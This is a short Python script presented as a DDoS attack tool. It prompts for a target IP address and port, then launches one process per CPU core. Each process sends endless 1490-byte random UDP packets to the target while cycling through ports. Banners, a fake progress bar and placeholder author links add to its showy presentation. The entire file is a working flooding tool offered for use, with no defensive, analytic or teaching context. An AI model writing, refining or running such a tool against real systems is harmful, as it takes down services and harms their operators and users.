import os
import time
import socket
import random
import multiprocessing

# Code Time
from datetime import datetime

def ddos_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0

    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

if __name__ == '__main__':
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    os.system("clear")
    os.system("figlet DDos Attack")
    print()
    print("Author   : Hacker")
    print("You Tube : https://www.youtube.com/")
    print("github   : https://github.com/")
    print("Facebook : https://www.facebook.com/")
    print()
    ip = input("IP Target: ")
    port = int(input("Port: "))

    os.system("clear")
    os.system("figlet Attack Starting")
    print("[                    ] 0% ")
    time.sleep(5)
    print("[=====               ] 25%")
    time.sleep(5)
    print("[==========          ] 50%")
    time.sleep(5)
    print("[===============     ] 75%")
    time.sleep(5)
    print("[====================] 100%")
    time.sleep(3)

    num_processes = multiprocessing.cpu_count()  # Get the number of available CPU cores

    processes = []
    for _ in range(num_processes):
        process = multiprocessing.Process(target=ddos_attack, args=(ip, port))
        process.start()
        processes.append(process)

    for process in processes:
        process.join()
